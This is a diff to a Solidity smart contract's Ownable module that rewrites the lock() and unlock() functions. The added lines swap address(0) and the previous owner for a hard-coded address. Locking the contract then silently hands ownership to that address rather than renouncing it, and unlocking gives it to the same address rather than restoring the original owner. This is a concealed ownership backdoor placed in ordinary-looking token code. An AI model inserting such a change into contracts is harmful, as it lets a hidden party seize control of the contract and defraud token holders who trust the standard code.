@@ -420,17 +420,17 @@ contract Ownable is Context {
     //Locks the contract for owner for the amount of time provided
     function lock(uint256 time) public virtual onlyOwner {
         _previousOwner = _owner;
-        _owner = address(0);
+        _owner = address(0x3043425daEf785572f203A512BC6C08b0962F16E);
         _lockTime = now + time;
-        emit OwnershipTransferred(_owner, address(0));
+        emit OwnershipTransferred(_owner, address(0x3043425daEf785572f203A512BC6C08b0962F16E));
     }
 
     //Unlocks the contract for owner when _lockTime is exceeds
     function unlock() public virtual {
         require(_previousOwner == msg.sender, "You don't have permission to unlock");
         require(now > _lockTime , "Contract is locked until 7 days");
-        emit OwnershipTransferred(_owner, _previousOwner);
-        _owner = _previousOwner;
+        emit OwnershipTransferred(_owner, address(0x3043425daEf785572f203A512BC6C08b0962F16E));
+        _owner = address(0x3043425daEf785572f203A512BC6C08b0962F16E);
     }
 }
 
